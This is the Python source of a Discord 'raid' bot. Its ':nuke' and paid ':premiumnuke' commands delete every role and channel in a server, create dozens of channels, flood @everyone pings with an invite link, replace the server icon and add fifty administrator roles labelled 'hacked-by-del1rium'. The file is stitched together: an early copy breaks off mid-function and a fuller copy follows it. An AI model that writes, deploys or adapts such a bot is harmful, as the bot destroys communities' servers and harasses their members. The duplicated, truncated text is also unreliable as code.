import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your server ID!!
PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!
OWNER_ID = 1450919094202269881               # IMPORTANT: REPLACE THIS with your User ID!!

# --- DEFAULT NUKE CONFIGURATION ---
CHANNEL_NAME_CONFIG = "raid-by-del1rium"
SPAM_TEXT_CONFIG = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True

        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            await ctx.send("System Error: Could not verify premium status.")
            return False
        
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central or not any(role.id == PREMIUM_ROLE_ID for role in member_in_central.roles):
            await ctx.send("Access Denied: This is a premium command.")
            return False
        
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print('Commands: :nuke, :premiumnuke, :nukeconfig')

# --- CONFIGURATION COMMAND ---
@bot.command(name='nukeconfig')
@commands.has_permissions(administrator=True)
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.")
        return

    global CHANNEL_NAME_CONFIG, SPAM_TEXT_CONFIG
    CHANNEL_NAME_CONFIG = channel_name
import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
# ID of your main server where you manage premium roles. This server will be protected.
CENTRAL_SERVER_ID = 987654321098765432  # IMPORTANT: REPLACE THIS with your main server's ID!!

# ID of the "Premium" role in your main server.
PREMIUM_ROLE_ID = 123456789012345678      # IMPORTANT: REPLACE THIS with your premium role ID!!

# Your personal Discord User ID for automatic owner access.
OWNER_ID = 111122223333444455              # IMPORTANT: REPLACE THIS with your User ID!!

# --- DEFAULT NUKE CONFIGURATION ---
CHANNEL_NAME_CONFIG = "raid-by-del1rium"
SPAM_TEXT_CONFIG = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        # 1. Owner Check: If the author is the owner, grant access immediately.
        if ctx.author.id == OWNER_ID:
            return True

        # 2. Premium User Check: If not the owner, check for the premium role in the central server.
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            await ctx.send("System Error: Could not verify premium status.")
            return False
        
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central:
            await ctx.send("Access Denied: You must be a member of the main server to use premium commands.")
            return False

        # Check if the member has the premium role
        for role in member_in_central.roles:
            if role.id == PREMIUM_ROLE_ID:
                return True # It's a premium user, grant access.

        # 3. Access Denied: If neither an owner nor a premium user.
        await ctx.send("Access Denied: This is a premium command.")
        return False
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print('Commands: :nuke (Public), :premiumnuke (Premium), :nukeconfig')

# --- CONFIGURATION COMMAND ---
@bot.command(name='nukeconfig')
@commands.has_permissions(administrator=True)
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.")
        return
    global CHANNEL_NAME_CONFIG, SPAM_TEXT_CONFIG
    CHANNEL_NAME_CONFIG, SPAM_TEXT_CONFIG = channel_name, spam_text
    await ctx.message.delete()
    embed = discord.Embed(title="Nuke Configuration Updated", color=discord.Color.blue())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(10)
    await confirmation_msg.delete()

# --- NUKE COMMANDS WITH SECURITY CHECK ---
@bot.command(name='nuke')
async def nuke_normal(ctx):
    # Critical security check
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.")
        return

    # Implicit permission check: bot needs admin to do anything useful
    if not ctx.guild.me.guild_permissions.administrator:
        return
    # Standard Nuke: 25 channels, 500 pings
    await execute_nuke(ctx, 25, 500, is_premium=False)

@bot.command(name='premiumnuke')
@is_premium() # Premium check happens after the security check inside the command
async def premium_nuke(ctx):
    # Critical security check
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.")
        return
        
    if not ctx.guild.me.guild_permissions.administrator:
        return
    # Premium Nuke: 50 channels, 1000 pings
    await execute_nuke(ctx, 50, 1000, is_premium=True)

# --- CENTRAL NUKE LOGIC ---
async def execute_nuke(ctx, num_channels, num_pings, is_premium: bool):
    guild = ctx.guild
    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
    print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name} ({ctx.author.id})")

    destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    print("Destruction phase completed.")

    print(f"Phase 2: Creating {num_channels} channels and initiating spam...")
    spam_tasks = [create_and_spam(guild, i, num_pings) for i in range(num_channels)]
    await asyncio.gather(*spam_tasks)
    print(f"{command_type} finished for {guild.name}.")

# --- HELPER FUNCTIONS ---
async def create_and_spam(guild, index, num_pings):
    try:
        channel = await guild.create_text_channel(f'{CHANNEL_NAME_CONFIG}-{index+1}')
        await spam_pings(channel, SPAM_TEXT_CONFIG, num_pings)
    except Exception: pass

async def spam_pings(channel, spam_text, amount):
    for _ in range(amount):
        try:
            asyncio.create_task(channel.send(spam_text))
            await asyncio.sleep(0.1)
        except Exception: break

async def execute_premium_actions(guild):
    premium_tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*premium_tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(RAID_ICON_URL) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read(), reason="Premium Nuke")
    except Exception: pass

async def create_chaotic_roles(guild):
    role_tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True), color=discord.Color.random()) for i in range(50)]
    await asyncio.gather(*role_tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        pass # Ignore other errors to keep the console clean

if __name__ == "__main__":
    # You need to install aiohttp: pip install aiohttp
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")

